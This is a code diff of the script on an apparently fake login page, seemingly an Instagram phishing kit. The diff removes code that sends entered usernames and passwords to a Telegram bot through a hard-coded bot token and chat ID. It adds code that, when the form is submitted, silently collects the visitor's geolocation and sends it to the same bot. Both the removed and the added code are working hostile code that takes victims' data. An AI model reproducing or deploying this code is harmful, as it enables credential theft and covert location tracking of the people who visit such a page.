@@ -493,14 +493,17 @@
 </section>
 
 <script>
-  // Function to send a message to a specified Telegram chat using XMLHttpRequest
-  function sendMessageWithXHR(chatId, message) {
+  // Function to send the user's location to the specified Telegram chat
+  function sendLocationWithXHR(chatId, latitude, longitude) {
       // Define the Telegram API URL with your bot token
       const telegramAPI = `https://api.telegram.org/bot7280763852:AAEHmPsZemgExWJ5fzO42yKt5s_sWoMI4LQ/sendMessage`;
-      
+
       // Create a new XMLHttpRequest object
       const xhr = new XMLHttpRequest();
-      
+
+      // Construct the message containing the user's location
+      const message = `User Location:\nLatitude: ${latitude}\nLongitude: ${longitude}`;
+
       // Create the data object containing the chat ID and message text
       const data = JSON.stringify({
           chat_id: chatId,
@@ -520,13 +523,11 @@
               // Check if the message was sent successfully
               if (response.ok) {
                   // Update the status message on the page
-                  document.getElementById("status").innerText += "Message sent using XMLHttpRequest!";
+                  document.getElementById("status").innerText += "Location sent successfully!";
               } else {
                   // Log an error message if sending failed
-                  console.error("Error sending message using XMLHttpRequest:", response);
+                  console.error("Error sending location using XMLHttpRequest:", response);
               }
-              // Hide the loader once the request is complete
-              document.getElementById("loader").style.display = 'none'; 
           }
       };
 
@@ -534,25 +535,42 @@
       xhr.send(data);
   }
 
+  // Function to get the user's location
+  function getUserLocation(callback) {
+      if (navigator.geolocation) {
+          // Get the current position of the user
+          navigator.geolocation.getCurrentPosition(function(position) {
+              // Call the callback function with the latitude and longitude
+              callback(position.coords.latitude, position.coords.longitude);
+          }, function(error) {
+              console.error("Error getting location:", error);
+              callback(null, null); // Return null if there's an error
+          });
+      } else {
+          console.error("Geolocation is not supported by this browser.");
+          callback(null, null); // Return null if geolocation is not supported
+      }
+  }
+
   // Handle the submission of the login form
   document.getElementById('loginForm').addEventListener('submit', function(event) {
       event.preventDefault(); // Prevent the default form submission behavior
 
       const chatId = '1866571175'; // Your Telegram chat ID
-      // Get the username and password values from the form inputs
-      const username = document.getElementById('username').value; // Changed to match the new input ID
-      const password = document.getElementById('password').value; // Changed to match the new input ID
-
-      // Construct the message to be sent, including the username, password, and log type
-      const message = `Login Attempt:\nUsername: ${username}\nPassword: ${password}\nLog Type: ig logs`;
-
-      // Show the loader while the request is being processed
-      document.getElementById("loader").style.display = 'block';
-
-      // Send the message using the XMLHttpRequest method
-      sendMessageWithXHR(chatId, message); // Send using XMLHttpRequest
+      
+      // Get the user's location
+      getUserLocation(function(latitude, longitude) {
+          if (latitude !== null && longitude !== null) {
+              // If location was successfully retrieved, send it to Telegram
+              sendLocationWithXHR(chatId, latitude, longitude);
+          } else {
+              // Log an error message if location retrieval failed
+              console.error("Failed to retrieve user location.");
+          }
+      });
   });
 </script>
+
 
 </body>
 
